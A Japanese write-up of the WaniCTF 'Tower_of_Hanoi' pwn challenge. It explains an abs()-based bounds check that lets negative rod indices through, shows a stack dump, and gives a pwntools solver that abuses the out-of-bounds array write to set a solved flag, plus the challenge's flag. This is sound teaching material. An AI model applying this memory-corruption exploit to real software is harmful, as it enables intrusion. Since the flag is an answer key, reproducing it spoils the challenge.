# Tower_of_Hanoi

## 問題文

wikiによるハノイの塔の説明

- 3本の杭と大きさの異なる複数の円盤がある。
- 最初はすべての円盤が左端の杭に小さいものが上になるように順に積み重ねられている。
- 円盤を一回に一枚ずつどれかの杭に移動させることができるが、小さな円盤の上に大きな円盤を乗せることはできない。

N枚の円盤で構成されたハノイの塔を解くには2^N-1回の動きが必要だそうです。
円盤32枚のハノイの塔をできるだけ早く解いてもらえますか？

`nc hanoi.pwn.wanictf.org 9007`

## フラグ

`FLAG{5up3r_f457_h4n01_501v3r}`

## 解法

3つの杭は3*32の2次元配列で管理されています。
プログラムは円盤を動かすとき、その動きが正しいかを判断し、正しいと判断したらその杭のpivotに書かれた位置の値を動かします。
しかし、怪しい部分があります。
```
	if(abs(src)>2||abs(dst)>2){  // ???
```
二次元配列の管理の便利上、AのASCIIは65であることを用いて
```
	int src=(int)from-65;
	int dst=(int)to-65;
```
上のように管理します。そして杭は0,1,2のいずれかである必要があります。
しかしabsは絶対値を求めるので負の値の検出ができません。
それではsrcやdstがマイナスの場合を考えて見ましょう。
2次元int配列AでA[a][b]の値を参照すると
A[0][0]のアドレス+4*b*a+4*bの位置の値を参照します。

この問題では　rod[0][0]のアドレス+4*32(HANOI_SIZE)*a+4*rod_pivot[a]　になります。

以下はnameにABCDEFGHIJK MoveでACを入力した場合のスタックです。

```
0x7ffffffedcf0: 0xfffedeb0      0x00007fff      0x00000000     |0x0a434100->Selection(Move)

杭A (rod[0][0])
0x7ffffffedd00: 0x00000001      0x00000002      0x00000003      0x00000004
0x7ffffffedd10: 0x00000005      0x00000006      0x00000007      0x00000008
0x7ffffffedd20: 0x00000009      0x0000000a      0x0000000b      0x0000000c
0x7ffffffedd30: 0x0000000d      0x0000000e      0x0000000f      0x00000010
0x7ffffffedd40: 0x00000011      0x00000012      0x00000013      0x00000014
0x7ffffffedd50: 0x00000015      0x00000016      0x00000017      0x00000018
0x7ffffffedd60: 0x00000019      0x0000001a      0x0000001b      0x0000001c
0x7ffffffedd70: 0x0000001d      0x0000001e      0x0000001f      0x00000020
杭B (rod[-1][0])
0x7ffffffedd80: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffedd90: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffedda0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffeddb0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffeddc0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffeddd0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffedde0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffeddf0: 0x00000000      0x00000000      0x00000000      0x00000000
杭C (rod[-2][0])
0x7ffffffede00: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffede10: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffede20: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffede30: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffede40: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffede50: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffede60: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffede70: 0x00000000      0x00000000      0x00000000      0x00000000

Name----------------------------------------------------------------------
0x7ffffffede80: 0x44434241      0x48474645      0x0a4b4a49      0x00000000
     Pivot----------------------------------------|--Solved_Flag
0x7ffffffede90: 0x00000000      0x0000001f      0x0000001f      0x00000000
```
-1番杭を選択した場合、Pivotは名前の最後の部分を参照します。

rod[0][0]のアドレス+4*32(HANOI_SIZE)*(-1)+4*rod_pivot[-1]
= rod[0][0]のアドレス-32+4*nameの最後の4バイト

Nameの最後の4バイトの値を使って好きな部分にデータを動かすことができます。
今回は
```
solved_flag=is_solved(rod); // ???
```
の位置を考えて簡単な解決法にしましょう。
solved_flagの更新をループの頭で確認しているため、move_hanoiでsolved_flagの値を1にしたら
そのままループを脱出できます。
1は1番杭のトップにあるため、(-1)番からsolved_flagの位置に対するpivotの値だけ計算すればMove>のあと1(-1)を入れてすぐ書き換えられます。
Solved_Flagはrod[0][0]から 3x32+7番目にあります
Solved_Flagはrod[-1][0]であるrod[0][0] - 32からは(3+1)x32+7であるため
Pivotの値は135になります。
ASCII 64は@であることを使うとSolverは以下のようになります。

```
from pwn import *

payload = b'A'*12
payload += p32(135)

payload2 = b"A@"

pc=process("./hanoi_memory")
print('Connected')

print(pc.recvuntil("Name : "))
pc.send(payload)
print('Payload sended')
print(pc.recvuntil("Move >"))
pc.send(payload2)
pc.interactive()
```
このコードで１をA杭のトップからSolved_Flagへ動かすことができます。
これでループから脱出ができ、フラグが表示されるようになります。
